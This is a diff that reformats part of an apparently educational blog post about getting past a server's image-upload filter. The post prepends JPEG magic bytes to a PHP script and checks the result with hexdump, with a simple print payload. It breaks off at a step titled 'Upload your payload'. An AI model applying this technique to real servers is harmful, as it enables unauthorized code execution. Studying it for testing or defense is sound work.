@@ -37,7 +37,9 @@ I tried to prepend a jpeg signature to my php script and found that it still did
 ~# hexdump image.jpeg
 0000000 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 00 00 01
 ```
+
 Then I tried the same thing on my malfunctioning payload:
+
 ```
 ~# hexdump test.php
 0000000 46 46 44 38 46 46 45 30 0a 3c 3f 70 68 70 0a 24
@@ -49,6 +51,7 @@ Then I tried the same thing on my malfunctioning payload:
 0000060 3e 22 3b 0a 3f 3e 0a
 0000067
 ```
+
 Okay, so I can't write that by hand.  A little online research suggested writing some code to do it for me:
 {% highlight python linenos %}
 #!/bin/python
@@ -63,6 +66,7 @@ So then I opened up my file with an editor:
 {% endhighlight %}
 Those weird characters before my php script are the binary hex values that we were looking for.
 Just to confirm, I took a look at the file in hexdump again:
+
 ```bash
 ~# hexdump test.php
 0000000 ff d8 ff e0 3c 3f 70 68 70 20 70 72 69 6e 74 20
@@ -72,6 +76,7 @@ Just to confirm, I took a look at the file in hexdump again:
 0000040 0a
 0000041
 ```
+
 It worked.  Now lets see if we can fool the server.
 
 ## Step 3: Upload your payload
